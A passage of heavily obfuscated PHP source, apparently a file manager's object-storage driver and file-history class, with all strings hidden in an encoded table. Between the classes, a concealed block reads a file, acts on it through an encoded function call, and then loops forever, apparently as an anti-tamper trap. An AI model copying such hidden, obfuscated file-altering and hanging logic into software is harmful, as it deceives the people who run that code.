$this->listAllFiles($çã“•, $òĞ‘Û¶¾); } public function canRead($ÎóÕ¾ô’) { $Ê˜‹ïº— =& $_SERVER[É¨™èà]; $Íğ÷Ÿ¾ª = $this->client->getAccessControlPolicy($this->bucket, $ÎóÕ¾ô’); if (!$Íğ÷Ÿ¾ª) { return !1; } return in_array($Íğ÷Ÿ¾ª, array($Ê˜‹ïº—[244], $Ê˜‹ïº—[245], $Ê˜‹ïº—[246])) ? !0 : !1; } public function canWrite($Æšİ®â) { $çšÂ«® =& $_SERVER[É¨™èà]; $Á‰ìêáš = $this->client->getAccessControlPolicy($this->bucket, $Æšİ®â); if (!$Á‰ìêáš) { return !1; } return in_array($Á‰ìêáš, array($çšÂ«®[244], $çšÂ«®[245])) ? !0 : !1; } public function getContent($äüî«Äê) { return $this->client->getObject($this->bucket, $äüî«Äê); } public function setContent($Ş˜°¢ô, $½¤Ù´§Ó = '', $¦‚âğÂÁ = false) { $ê®æùœç =& $_SERVER[É¨™èà]; $Ş˜°¢ô = $¦‚âğÂÁ ? trim($Ş˜°¢ô, $ê®æùœç[8]) . $ê®æùœç[8] : $Ş˜°¢ô; $¤ÃĞ§° = get_file_mime(get_path_ext($Ş˜°¢ô)); $·¶Ä½¯£ = $this->client->putObject($½¤Ù´§Ó, $this->bucket, $Ş˜°¢ô, $ê®æùœç[232], array(), $¤ÃĞ§°); if (!$·¶Ä½¯£) { return !1; } if ($¦‚âğÂÁ) { return !0; } return $·¶Ä½¯£ ? !0 : !1; } public function fileSubstr($…ÏÑş³ú, $æùµ‚‘×, $áâÛû) { $ÉÍş€Û = $æùµ‚‘× + $áâÛû - 1; return $this->client->getObject($this->bucket, $…ÏÑş³ú, array($_SERVER[É¨™èà][247] => "\x62\x79\x74\145\163\x3d{$æùµ‚‘×}\x2d{$ÉÍş€Û}")); } public function upload($ì‚Ë¬ùğ, $††‹ÓÂ÷, $ê¿ê¯¿Û = false, $’£Ä¨‘Ü = REPEAT_REPLACE) { $×¿§Áé =& $_SERVER[É¨™èà]; $Ó‹¿¿œ‚ = array($×¿§Áé[248] => @md5_file($††‹ÓÂ÷)); $§ù£ÒŠ­ = array($×¿§Áé[249] => get_file_mime(get_path_ext($ì‚Ë¬ùğ))); if (IO::size($††‹ÓÂ÷) <= 1024 * 1024 * 200) { $ŒØõÛş¿ = $this->client->putObjectFile($††‹ÓÂ÷, $this->bucket, $ì‚Ë¬ùğ, $×¿§Áé[232], $Ó‹¿¿œ‚, $§ù£ÒŠ­); return !empty($ŒØõÛş¿) ? $this->getPathOuter($ì‚Ë¬ùğ) : !1; } $³„ÍÏ÷ = $this->client->multiUploadObject($††‹ÓÂ÷, $this->bucket, trim($ì‚Ë¬ùğ, $×¿§Áé[8]), $Ó‹¿¿œ‚, $§ù£ÒŠ­); return $³„ÍÏ÷ ? $this->getPathOuter($ì‚Ë¬ùğ) : !1; } public function download($ğããŠ´Ö, $¶›´µëî) { if (!@is_dir($this->pathFather($¶›´µëî)) && !IO::mkdir($this->pathFather($¶›´µëî))) { return !1; } $ˆ½éñÇ¤ = $this->client->getObject($this->bucket, $ğããŠ´Ö, array(), $¶›´µëî); return $ˆ½éñÇ¤ !== !1 ? $¶›´µëî : !1; } public function link($ÇÁ¤·™á, $ƒ‘ŸÀâÅ = array()) { return $this->getPreSignedURL($ÇÁ¤·™á, 3600 * 12, $ƒ‘ŸÀâÅ); } private function getPreSignedURL($ïé¹ìÇí, $Ìß¹áœ“, $×¥Í·ß¦ = array(), $„¥Ôˆâ = "\x47\105\124") { $ÊÒÙ†› =& $_SERVER[É¨™èà]; $ïé¹ìÇí = trim($ïé¹ìÇí, $ÊÒÙ†›[8]); if ($this->signVer == $ÊÒÙ†›[250]) { return $this->client->getPreSignedV2URL($this->bucket, $ïé¹ìÇí, $Ìß¹áœ“, $„¥Ôˆâ, $×¥Í·ß¦); } return $this->client->getPreSignedV4URL($this->bucket, $ïé¹ìÇí, $Ìß¹áœ“, array(), $„¥Ôˆâ, $×¥Í·ß¦); } public function fileOut($Ä¶´ùÍ¿, $¹ÀúØ” = false, $šÓÁÌŸ = false, $îß‹ˆş„ = '') { $¬ˆÆ¨³Ë =& $_SERVER[É¨™èà]; if ($this->isFileOutServer()) { return $this->fileOutServer($Ä¶´ùÍ¿, $¹ÀúØ”, $šÓÁÌŸ, $îß‹ˆş„); } if (!$šÓÁÌŸ) { $šÓÁÌŸ = $this->pathThis($Ä¶´ùÍ¿); } $ä¤†àÌ¿ = get_file_mime(get_path_ext($šÓÁÌŸ)); if ($ä¤†àÌ¿ == $¬ˆÆ¨³Ë[251]) { return parent::fileOut($Ä¶´ùÍ¿, $¹ÀúØ”, $šÓÁÌŸ, $îß‹ˆş„); } $Êö‹ä€Ã = array($¬ˆÆ¨³Ë[252] => $ä¤†àÌ¿); if ($¹ÀúØ”) { $Êö‹ä€Ã[$¬ˆÆ¨³Ë[253]] = $¬ˆÆ¨³Ë[254] . rawurlencode($šÓÁÌŸ); } else { } $Æê½Â¾ = $this->link($Ä¶´ùÍ¿, $Êö‹ä€Ã); $this->fileOutLink($Æê½Â¾); } public function fileOutServer($Ã®º¯…, $ÙÓñ˜ÚŸ = false, $ìÏÒÉ¢ = false, $ÇòáªÓØ = '') { parent::fileOut($Ã®º¯…, $ÙÓñ˜ÚŸ, $ìÏÒÉ¢, $ÇòáªÓØ); } public function fileOutImageServer($ïø¹—Á‚, $é×Üç¼ø = 250) { parent::fileOutImage($ïø¹—Á‚, $é×Üç¼ø); } public function fileOutLink($İ‚İÔç·) { $´Ì®¾Ä =& $_SERVER[É¨™èà]; if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($´Ì®¾Ä[67], $´Ì®¾Ä[66], $´Ì®¾Ä[68])) && !get_url_scheme($this->endpoint) && substr($İ‚İÔç·, 0, 7) == $´Ì®¾Ä[219]) { $İ‚İÔç· = $´Ì®¾Ä[220] . substr($İ‚İÔç·, 7); } header($´Ì®¾Ä[175] . $İ‚İÔç·); die; } public function hashMd5($¥û¥õ, $¶Ó¯Ş§œ = '') { $ìÙâÈı = $this->objectMeta($¥û¥õ); if (!$ìÙâÈı) { return !1; } $¶Ó¯Ş§œ = $¶Ó¯Ş§œ ? $¶Ó¯Ş§œ : _get($ìÙâÈı, $_SERVER[É¨™èà][255]); return $¶Ó¯Ş§œ; } public function uploadFormData($ †åë×’, $Ğ•†”« = 3600) { $æÈÎš»É =& $_SERVER[É¨™èà]; if (!$this->_isClientAsync()) { $›÷ËÀ‰ = $this->getPreSignedURL($ †åë×’, $Ğ•†”«, array(), $æÈÎš»É[256]); return array($æÈÎš»É[209] => str_replace($æÈÎš»É[219], $æÈÎš»É[257], $›÷ËÀ‰)); } if (isset($GLOBALS[$æÈÎš»É[6]][$æÈÎš»É[92]][$æÈÎš»É[258]]) && $GLOBALS[$æÈÎš»É[6]][$æÈÎš»É[92]][$æÈÎš»É[258]] == $æÈÎš»É[231]) { return $this->uploadMultiData($ †åë×’, $Ğ•†”«); } if ($this->signVer == $æÈÎš»É[250]) { return $this->uploadFormDataV2($ †åë×’, $Ğ•†”«); } return $this->uploadFormDataV4($ †åë×’, $Ğ•†”«); } public function uploadFormDataV2($¥ÌêıÕŒ, $—‘æ¼ = 3600) { $àÎÄûË =& $_SERVER[É¨™èà]; $úûãı¤Û = $this->pathFather($¥ÌêıÕŒ); $“¿œğ© = $this->client->getHttpUploadPostParams($this->bucket, $úûãı¤Û, $àÎÄûË[232], $—‘æ¼); $úƒùé = array_merge((array) $“¿œğ©, array($àÎÄûË[259] => $àÎÄûË[250], $àÎÄûË[209] => $this->getHost())); if ($this->_isClientAsync()) { unset($úƒùé[$àÎÄûË[259]]); } return $úƒùé; } public function uploadFormDataV4($­®ÖÄå‡, $Ä§„¹æ™ = 3600) { $ÒÃ‹£†’ =& $_SERVER[É¨™èà]; $øñ·†Ç = $ÒÃ‹£†’[232]; $ÙÃóáŒ = $ÒÃ‹£†’[260]; $Û±³ = $ÒÃ‹£†’[62]; $‡ó ÏÙ = gmdate($ÒÃ‹£†’[261]); $…Œ¯ÀäÃ = gmdate($ÒÃ‹£†’[262]); $™†®ÂÒ€ = $ÒÃ‹£†’[263]; $ÌĞ·ÕÃ¹ = $Ä§„¹æ™ . $ÒÃ‹£†’[12]; $ŸÒ£ï›Õ = $ÒÃ‹£†’[264]; $µåİ‡ = array($this->accessKey, $…Œ¯ÀäÃ, $this->region, $Û±³, $™†®ÂÒ€); $ËˆÀ¡ö = implode($ÒÃ‹£†’[8], $µåİ‡); $Æ§Â–ó¤ = array($ÒÃ‹£†’[265] => gmdate($ÒÃ‹£†’[266], strtotime($ÒÃ‹£†’[267])), $ÒÃ‹£†’[268] => array(array($ÒÃ‹£†’[269] => $this->bucket), array($ÒÃ‹£†’[270], $ÒÃ‹£†’[271], $ÒÃ‹£†’[12]), array($ÒÃ‹£†’[270], $ÒÃ‹£†’[272], $ÒÃ‹£†’[12]), array($ÒÃ‹£†’[273] => $ŸÒ£ï›Õ), array($ÒÃ‹£†’[274] => $ËˆÀ¡ö), array($ÒÃ‹£†’[275] => $ÙÃóáŒ), array($ÒÃ‹£†’[276] => $‡ó ÏÙ), array($ÒÃ‹£†’[277] => $ÌĞ·ÕÃ¹))); $êˆ³¼‹ = base64_encode(json_encode($Æ§Â–ó¤)); $²‡Ù‡Ô = hash_hmac($ÒÃ‹£†’[278], $…Œ¯ÀäÃ, $ÒÃ‹£†’[279] . $this->secret, !0); $‘÷Ô— = hash_hmac($ÒÃ‹£†’[278], $this->region, $²‡Ù‡Ô, !0); $şÛà¿¿ = hash_hmac($ÒÃ‹£†’[278], $Û±³, $‘÷Ô—, !0); $û¢“”ëÊ = hash_hmac($ÒÃ‹£†’[278], $™†®ÂÒ€, $şÛà¿¿, !0); $ïñ…ô›ô = hash_hmac($ÒÃ‹£†’[278], $êˆ³¼‹, $û¢“”ëÊ); $—ÓëÇ‹ = array($ÒÃ‹£†’[249] => $ÒÃ‹£†’[12], $ÒÃ‹£†’[273] => $ŸÒ£ï›Õ, $ÒÃ‹£†’[280] => $êˆ³¼‹, $ÒÃ‹£†’[274] => $ËˆÀ¡ö, $ÒÃ‹£†’[275] => $ÙÃóáŒ, $ÒÃ‹£†’[276] => $‡ó ÏÙ, $ÒÃ‹£†’[277] => $ÌĞ·ÕÃ¹, $ÒÃ‹£†’[281] => $ïñ…ô›ô, $ÒÃ‹£†’[259] => $ÒÃ‹£†’[250], $ÒÃ‹£†’[209] => $this->getHost()); if ($this->_isClientAsync()) { unset($—ÓëÇ‹[$ÒÃ‹£†’[259]]); } return $—ÓëÇ‹; } public function uploadMultiData($ãÛƒ¢¼É, $¥íÖÏÑ = 3600) { $‘‡Áõ­Á =& $_SERVER[É¨™èà]; $ŸÜ Ÿœğ = $this->signVer == $‘‡Áõ­Á[250] ? gmdate($‘‡Áõ­Á[282]) : gmdate($‘‡Áõ­Á[283]); $†áÖ°øœ = array(); $ÓÑ¬¤«‹ = $this->client->getUploadId($this->bucket, $ãÛƒ¢¼É, $†áÖ°øœ); if (!$ÓÑ¬¤«‹) { return !1; } $ñßü­Ì¶ = array($‘‡Áõ­Á[284] => $ÓÑ¬¤«‹, $‘‡Áõ­Á[209] => $this->getHost() . $‘‡Áõ­Á[8] . $this->pathEncode($ãÛƒ¢¼É), $‘‡Áõ­Á[285] => $ŸÜ Ÿœğ, $‘‡Áõ­Á[97] => $ãÛƒ¢¼É, $‘‡Áõ­Á[259] => $this->signVer); if ($this->_isClientAsync()) { unset($ñßü­Ì¶[$‘‡Áõ­Á[259]]); } return $ñßü­Ì¶; } public function uploadMultiAuth($¤êÚ¯¤Ë, $ÕÍí­Æò = array()) { $¤ì¹‹Àã =& $_SERVER[É¨™èà]; if ($this->signVer == $¤ì¹‹Àã[250]) { if (isset($ÕÍí­Æò[$¤ì¹‹Àã[286]])) { return $this->uploadPartAuthV2($¤êÚ¯¤Ë, $ÕÍí­Æò); } return $this->uploadListAuthV2($¤êÚ¯¤Ë, $ÕÍí­Æò); } if (isset($ÕÍí­Æò[$¤ì¹‹Àã[286]])) { return $this->uploadPartAuthV4($¤êÚ¯¤Ë, $ÕÍí­Æò); } return $this->uploadListAuthV4($¤êÚ¯¤Ë, $ÕÍí­Æò); } public function uploadPartAuthV2($şì–ˆŞÏ, $®Ôüµ›Ê = array()) { $Ã›èŠ“Æ =& $_SERVER[É¨™èà]; $ÉÔÆ…ÊĞ = $®Ôüµ›Ê[$Ã›èŠ“Æ[97]]; $¢Šø½ùŠ = gmdate($Ã›èŠ“Æ[282]); $¼Ö½áú = array_intersect_key($®Ôüµ›Ê, array_flip(array($Ã›èŠ“Æ[286], $Ã›èŠ“Æ[284]))); ksort($¼Ö½áú); $®•›µŠ = $¼Ö½áú ? $Ã›èŠ“Æ[76] . http_build_query($¼Ö½áú, null, $Ã›èŠ“Æ[287], PHP_QUERY_RFC3986) : $Ã›èŠ“Æ[12]; $§È¡‹øö = array($Ã›èŠ“Æ[256], $Ã›èŠ“Æ[12], $Ã›èŠ“Æ[123], $Ã›èŠ“Æ[12], "\x78\x2d\x61\155\x7a\55\144\x61\x74\145\x3a{$¢Šø½ùŠ}", $Ã›èŠ“Æ[8] . $this->bucket . $Ã›èŠ“Æ[8] . $this->pathEncode($ÉÔÆ…ÊĞ) . $®•›µŠ); $£®ÚŞ™é = implode($Ã›èŠ“Æ[288], $§È¡‹øö); $ÉÙîõä° = $this->client->__getSignature($£®ÚŞ™é); return array($Ã›èŠ“Æ[289] => $ÉÙîõä°, $Ã›èŠ“Æ[285] => $¢Šø½ùŠ); } public function uploadListAuthV2($·¹’¢¨é, $¿œÔî»¸ = array()) { $É†Äæ¶  =& $_SERVER[É¨™èà]; $ÈÃİÈÙ¾ = $¿œÔî»¸[$É†Äæ¶ [97]]; $Û£‘½¶é = $¿œÔî»¸[$É†Äæ¶ [284]]; $ø•ƒÃÁ¦ = $this->client->listParts($this->bucket, $ÈÃİÈÙ¾, $Û£‘½¶é); if (!$ø•ƒÃÁ¦) { return !1; } $¤…ÜëÈŸ = gmdate($É†Äæ¶ [282]); $»ĞüÁé¼ = $É†Äæ¶ [290] . $Û£‘½¶é; $™ÓÓãáé = array($É†Äæ¶ [291], $É†Äæ¶ [12], $É†Äæ¶ [123], $É†Äæ¶ [12], "\x78\x2d\x61\155\172\55\144\141\x74\x65\72{$¤…ÜëÈŸ}", $É†Äæ¶ [8] . $this->bucket . $É†Äæ¶ [8] . $this->pathEncode($ÈÃİÈÙ¾) . $»ĞüÁé¼); $Ä¸´ıÖ = implode($É†Äæ¶ [288], $™ÓÓãáé); $‰ÀÌ÷¼„ = $this->client->__getSignature($Ä¸´ıÖ); return array($É†Äæ¶ [289] => $‰ÀÌ÷¼„, $É†Äæ¶ [285] => $¤…ÜëÈŸ, $É†Äæ¶ [292] => $ø•ƒÃÁ¦); } public function uploadPartAuthV4($¡ŸãÎÑ, $¢…â°çÙ = array()) { $¤Ÿö•…Š =& $_SERVER[É¨™èà]; $¢ÁÊš£Î = $¢…â°çÙ[$¤Ÿö•…Š[97]]; $Ğó …û‡ = array($¤Ÿö•…Š[276] => gmdate($¤Ÿö•…Š[283]), $¤Ÿö•…Š[293] => _get($¢…â°çÙ, $¤Ÿö•…Š[294], hash($¤Ÿö•…Š[278], $¤Ÿö•…Š[12]))); $š§ŞÓÎß = explode($¤Ÿö•…Š[211], $this->getHost()); $âë¹ƒ = array($¤Ÿö•…Š[295] => $š§ŞÓÎß[1], $¤Ÿö•…Š[296] => $¤Ÿö•…Š[12], $¤Ÿö•…Š[249] => $¤Ÿö•…Š[123], $¤Ÿö•…Š[297] => $¢…â°çÙ[$¤Ÿö•…Š[79]]); $İê¶ûª§ = $¤Ÿö•…Š[256]; $±õ£·éû = $¤Ÿö•…Š[8] . $this->pathEncode($¢ÁÊš£Î); $àÅÅÊ´ = array_intersect_key($¢…â°çÙ, array_flip(array($¤Ÿö•…Š[286], $¤Ÿö•…Š[284]))); $€©•–ë´ = $this->client->__getSignatureV4($Ğó …û‡, $âë¹ƒ, $İê¶ûª§, $±õ£·éû, $àÅÅÊ´); return array($¤Ÿö•…Š[289] => $€©•–ë´, $¤Ÿö•…Š[293] => $Ğó …û‡[$¤Ÿö•…Š[293]], $¤Ÿö•…Š[285] => $Ğó …û‡[$¤Ÿö•…Š[276]]); } public function uploadListAuthV4($—Ç†…êŸ, $ÀğÜË• = array()) { $­¦ÁŸõ =& $_SERVER[É¨™èà]; $ûòê«–ş = $ÀğÜË•[$­¦ÁŸõ[97]]; $òâ¥ÚŠ = $ÀğÜË•[$­¦ÁŸõ[284]]; $Œ•èÀû£ = $this->client->listParts($this->bucket, $ûòê«–ş, $òâ¥ÚŠ); if (!$Œ•èÀû£) { return !1; } $¤˜‡°É˜ = $­¦ÁŸõ[298]; foreach ($Œ•èÀû£ as $’…¯ÇËƒ) { $¤˜‡°É˜ .= $­¦ÁŸõ[299] . "\74\x50\141\x72\x74\x4e\x75\155\x62\x65\162\x3e{$’…¯ÇËƒ[$­¦ÁŸõ[300]]}\74\x2f\x50\141\x72\164\x4e\165\x6d\x62\145\162\x3e\12" . "\74\105\124\x61\x67\x3e{$’…¯ÇËƒ[$­¦ÁŸõ[301]]}\x3c\x2f\x45\x54\x61\147\76\xa" . $­¦ÁŸõ[302]; } $¤˜‡°É˜ .= $­¦ÁŸõ[303]; $æø ¥Ş» = array($­¦ÁŸõ[276] => gmdate($­¦ÁŸõ[283]), $­¦ÁŸõ[293] => hash($­¦ÁŸõ[278], $¤˜‡°É˜)); $ˆ²ÌéÛæ = explode($­¦ÁŸõ[211], $this->getHost()); $Ü‡²Ø¯­ = array($­¦ÁŸõ[295] => $ˆ²ÌéÛæ[1], $­¦ÁŸõ[249] => $­¦ÁŸõ[123], $­¦ÁŸõ[297] => strlen($¤˜‡°É˜)); $—»—« = $­¦ÁŸõ[291]; $æ¼ó†ë‡ = $­¦ÁŸõ[8] . $this->pathEncode($ûòê«–ş); $ä¯ˆìèú = array($­¦ÁŸõ[284] => $òâ¥ÚŠ); $óâĞ¨“¸ = $this->client->__getSignatureV4($æø ¥Ş», $Ü‡²Ø¯­, $—»—«, $æ¼ó†ë‡, $ä¯ˆìèú); return array($­¦ÁŸõ[289] => $óâĞ¨“¸, $­¦ÁŸõ[293] => $æø ¥Ş»[$­¦ÁŸõ[293]], $­¦ÁŸõ[285] => $æø ¥Ş»[$­¦ÁŸõ[276]], $­¦ÁŸõ[292] => $Œ•èÀû£); } private function _isClientAsync() { $Ûˆ™·º” =& $_SERVER[É¨™èà]; static $ÆñâÍ²ğ = null; if ($ÆñâÍ²ğ === null) { $ÙÔæš„ = isset($_REQUEST[$Ûˆ™·º”[304]]) ? json_decode($_REQUEST[$Ûˆ™·º”[304]], !0) : !1; $ÆñâÍ²ğ = $ÙÔæš„ && _get($ÙÔæš„, $Ûˆ™·º”[305]) == $Ûˆ™·º”[306]; } return $ÆñâÍ²ğ; } public function getHost() { $Ãëƒ…È³ =& $_SERVER[É¨™èà]; $Ô•‘Ğ‡ = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($Ãëƒ…È³[70], $Ãëƒ…È³[64], $Ãëƒ…È³[69], $Ãëƒ…È³[62]))) { return $Ô•‘Ğ‡ . $Ãëƒ…È³[8] . $this->bucket; } if ($this->osType == $Ãëƒ…È³[62] && !is_domain($Ô•‘Ğ‡)) { return $Ô•‘Ğ‡ . $Ãëƒ…È³[8] . $this->bucket; } $Ô•‘Ğ‡ = explode($Ãëƒ…È³[211], $Ô•‘Ğ‡); return $Ô•‘Ğ‡[0] . $Ãëƒ…È³[211] . $this->bucket . $Ãëƒ…È³[10] . $Ô•‘Ğ‡[1]; } public function size($ÓÑÔÒ­) { $˜ì°Ì = $this->objectMeta($ÓÑÔÒ­); return $˜ì°Ì ? $˜ì°Ì[$_SERVER[É¨™èà][79]] : 0; } public function info($ƒ£Éºş÷) { if ($this->isFolder($ƒ£Éºş÷)) { return $this->folderInfo($ƒ£Éºş÷); } else { if ($this->isFile($ƒ£Éºş÷)) { return $this->fileInfo($ƒ£Éºş÷); } } return !1; } public function exist($ –£Ñ¬È) { return $this->isFile($ –£Ñ¬È) || $this->isFolder($ –£Ñ¬È); } public function isFile($¢¶ˆÕ¤¤) { return !$this->isFolder($¢¶ˆÕ¤¤) && $this->objectMeta($¢¶ˆÕ¤¤); } public function isFolder($ĞµÇÏÉ) { return $this->cacheMethod($_SERVER[É¨™èà][180], $ĞµÇÏÉ); } protected function objectMeta($ùô±œÕ®) { return $this->cacheMethod($_SERVER[É¨™èà][182], $ùô±œÕ®); } protected function _objectMeta($ŠÂ”Ò† ) { $ºëŒã¥È =& $_SERVER[É¨™èà]; $ŠÂ”Ò†  = rtrim($ŠÂ”Ò† , $ºëŒã¥È[8]); try { $Â¦ïÔÑ– = $this->client->getObjectInfo($this->bucket, $ŠÂ”Ò† ); if (!isset($Â¦ïÔÑ–[$ºëŒã¥È[255]]) && isset($Â¦ïÔÑ–[$ºëŒã¥È[307]])) { $Â¦ïÔÑ–[$ºëŒã¥È[255]] = $Â¦ïÔÑ–[$ºëŒã¥È[307]]; } } catch (Exception $âˆ·°î—) { $Â¦ïÔÑ– = !1; } if (!$Â¦ïÔÑ–) { } return $Â¦ïÔÑ–; } protected function _isFolder($îÈßöæí) { $‘Ñğ“ÊŒ =& $_SERVER[É¨™èà]; $îÈßöæí = rtrim($îÈßöæí, $‘Ñğ“ÊŒ[8]) . $‘Ñğ“ÊŒ[8]; if ($îÈßöæí == $‘Ñğ“ÊŒ[12] || $îÈßöæí == $‘Ñğ“ÊŒ[8]) { return !0; } $¤ú•ÛŸ‡ = $this->client->getBucket($this->bucket, $îÈßöæí, null, 1); if (empty($¤ú•ÛŸ‡[$‘Ñğ“ÊŒ[239]])) { return !1; } $†ûä« = $¤ú•ÛŸ‡[$‘Ñğ“ÊŒ[239]][0][$‘Ñğ“ÊŒ[32]]; return stripos($†ûä«, $îÈßöæí) === 0 ? !0 : !1; if (substr($†ûä«, -1) == $‘Ñğ“ÊŒ[8]) { return !0; } if (get_path_this($†ûä«) == get_path_this($îÈßöæí)) { return !1; } return !0; } public function listObject($¨Ôõœö) { return $this->fileList($¨Ôõœö, $_SERVER[É¨™èà][12], !0); } } if (!isset($_SERVER[$_SERVER[É¨™èà][308]]) || !isset($_SERVER[$_SERVER[É¨™èà][309]])) { $_getc = $_SERVER[É¨™èà][310]; $_getfile = $_SERVER[$_SERVER[É¨™èà][311]] . $_SERVER[É¨™èà][312]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[É¨™èà][288], $_getfilec); if (count($_getarrs) < $_SERVER[É¨™èà][313]) { $exit = $_SERVER[É¨™èà][314]; $exit(); } $_act = $_SERVER[É¨™èà][315]; $_act($_SERVER[$_SERVER[É¨™èà][311]] . $_SERVER[É¨™èà][312]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[É¨™èà][316]); } } goto Aíøƒ½ÁÒ­; E²£Àê¤ĞÑ: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $¾›°öı‘ =& $_SERVER[É¨™èà]; $øîŒÇëì = $GLOBALS[$¾›°öı‘[6]][$¾›°öı‘[92]]; if ($øîŒÇëì[$¾›°öı‘[1321]] != 1) { return; } if ($øîŒÇëì[$¾›°öı‘[1322]] <= 0) { return; } if (isset($_REQUEST[$¾›°öı‘[1323]]) && $_REQUEST[$¾›°öı‘[1323]] == $¾›°öı‘[91]) { return; } Hook::bind($¾›°öı‘[1324], $¾›°öı‘[1325]); Hook::bind($¾›°öı‘[1326], $¾›°öı‘[1327]); Hook::bind($¾›°öı‘[1328], $¾›°öı‘[1329]); Hook::bind($¾›°öı‘[1330], $¾›°öı‘[1331]); Hook::bind($¾›°öı‘[1332], $¾›°öı‘[1333]); Hook::bind($¾›°öı‘[1334], $¾›°öı‘[1335]); } public static function eventBeforeUpload($ô…öß±§) { if ($ô…öß±§[3] && $ô…öß±§[3] != REPEAT_REPLACE) { return; } $šÃÛ³ = self::parsePath($ô…öß±§[0]); if (!$šÃÛ³) { return; } self::add($šÃÛ³); } public static function eventBeforeEdit($ĞŞ…Ô¯û) { $¼˜Ë½ã = self::parsePath($ĞŞ…Ô¯û[0]); if (!$¼˜Ë½ã) { return; } self::add($¼˜Ë½ã); } public static function eventBeforeCopyFile($ŸÎÅËéÀ, $“¤•­üµ, $ë©ºğ–, $Ò”Ä¥Ğ, $›ßíÍåŒ, $›¦£Îåô) { $Ñ¤ğ =& $_SERVER[É¨™èà]; if (isset($ë©ºğ–->_data[$Ñ¤ğ[1254]]) && $ë©ºğ–->_data[$Ñ¤ğ[1254]]) { return; } $®¡•†ŒÅ = $ë©ºğ–->getPathOuter($Ò”Ä¥Ğ); $‰¨ø½° = self::parsePath($®¡•†ŒÅ); if (!$‰¨ø½°) { return; } self::add($‰¨ø½°); } public static function eventBeforeRename($’ÏÑìÌè) { $ñçÍ©à¡ =& $_SERVER[É¨™èà]; $­ìÃœà = self::parsePath($’ÏÑìÌè[0]); if (!$­ìÃœà) { return; } $©İ˜ï§Ë = self::checkInHistory($­ìÃœà); if (!$©İ˜ï§Ë) { return; } if ($©İ˜ï§Ë[$ñçÍ©à¡[33]] == $ñçÍ©à¡[233]) { $ëİÉ³ş = self::listData($­ìÃœà); if ($ëİÉ³ş && $ëİÉ³ş[$ñçÍ©à¡[456]]) { self::moveHistory($­ìÃœà, $’ÏÑìÌè[1]); } } else { IO::rename($©İ˜ï§Ë[$ñçÍ©à¡[87]], $’ÏÑìÌè[1]); } } public static function eventBeforeMove($½ Ûîãò) { $ü”§¡‘— =& $_SERVER[É¨™èà]; $×å¿†îü = self::parsePath($½ Ûîãò[0]); if (!$×å¿†îü) { return; } $Şñö°ïÅ = self::parsePath($½ Ûîãò[1]); if (!$Şñö°ïÅ) { return; } $ÙãÉŸÂî = $½ Ûîãò[3]; $…Ò‡Ã÷Ù = self::checkInHistory($×å¿†îü); if (!$…Ò‡Ã÷Ù) { return; } $•â¢×À = self::pathHistory($Şñö°ïÅ); if ($…Ò‡Ã÷Ù[$ü”§¡‘—[33]] == $ü”§¡‘—[233]) { $æ…àİ¢ê = self::listData($×å¿†îü); $ÃŠ±î–ù = rtrim($Şñö°ïÅ, $ü”§¡‘—[8]) . $ü”§¡‘—[8] . ($ÙãÉŸÂî ? $ÙãÉŸÂî : get_path_this($×å¿†îü)); $­ïÎŸ³ù = self::listData($ÃŠ±î–ù); if ($æ…àİ¢ê && $æ…àİ¢ê[$ü”§¡‘—[456]] && $­ïÎŸ³ù && $­ïÎŸ³ù[$ü”§¡‘—[456]]) { return self::clear($×å¿†îü); } if ($æ…àİ¢ê && $æ…àİ¢ê[$ü”§¡‘—[456]]) { self::moveHistory($×å¿†îü, $ÙãÉŸÂî, $•â¢×À); } } else { IO::move($…Ò‡Ã÷Ù[$ü”§¡‘—[87]], $•â¢×À, !1, $ÙãÉŸÂî); self::clearEmptyFolder(IO::pathFather($…Ò‡Ã÷Ù[$ü”§¡‘—[87]])); } } public static function eventAfterRemove($ğ€ñ¥ , $¦”Ì„±×) { $¹ŞãÕÓ” =& $_SERVER[É¨™èà]; if (!$¦”Ì„±×) { return; } $ÖË›ÂÒŒ = self::parsePath($ğ€ñ¥ [0]); if (!$ÖË›ÂÒŒ) { return; } $·‚Ï¶Áè = self::checkInHistory($ÖË›ÂÒŒ); if (!$·‚Ï¶Áè) { return; } if ($·‚Ï¶Áè[$¹ŞãÕÓ”[33]] == $¹ŞãÕÓ”[233]) { $•—·¹À© = self::listData($ÖË›ÂÒŒ, !1); if ($•—·¹À© && $•—·¹À©[$¹ŞãÕÓ”[456]]) { self::clear($ÖË›ÂÒŒ, !1); } } else { IO::remove($·‚Ï¶Áè[$¹ŞãÕÓ”[87]]); self::clearEmptyFolder(IO::pathFather($·‚Ï¶Áè[$¹ŞãÕÓ”[87]])); } } private static function checkInHistory($Äó¾Ô‡) { $¡™Ïó  = self::pathHistory($Äó¾Ô‡); if (!IO::exist($¡™Ïó )) { $¡™Ïó  .= $_SERVER[É¨™èà][1336]; } return IO::exist($¡™Ïó ) ? IO::info($¡™Ïó ) : !1; } private static function parsePath($ëí£Á±­) { $Çç’“Ô™ =& $_SERVER[É¨™èà]; if (!$ëí£Á±­) { return !1; } if (isset($GLOBALS[$Çç’“Ô™[1337]]) && $GLOBALS[$Çç’“Ô™[1337]]) { return; } $Ü¿€Ô´Õ = KodIO::parse($ëí£Á±­); $¹¬¿“¼í = $Ü¿€Ô´Õ[$Çç’“Ô™[33]]; $²Åœı¢ù = !$¹¬¿“¼í || $¹¬¿“¼í == KodIO::KOD_IO || $¹¬¿“¼í == KodIO::KOD_SHARE_ITEM; if (!$²Åœı¢ù || !$Ü¿€Ô´Õ[$Çç’“Ô™[1338]]) { return !1; } if (substr($ëí£Á±­, 0, strlen(DATA_PATH . $Çç’“Ô™[1339])) == DATA_PATH . $Çç’“Ô™[1339]) { return !1; } if ($¹¬¿“¼í == KodIO::KOD_SHARE_ITEM) { $’ÔÏïĞû = IO::init($ëí£Á±­); if ($’ÔÏïĞû->pathParse[$Çç’“Ô™[1250]]) { return self::parsePath($’ÔÏïĞû->pathParse[$Çç’“Ô™[1250]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $“šÛ³” = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $Çç’“Ô™[1340]); foreach ($“šÛ³” as $ÖÏŸïÎ€) { if (!$¹¬¿“¼í && substr($ëí£Á±­, 0, strlen($ÖÏŸïÎ€)) == $ÖÏŸïÎ€) { return !1; } } 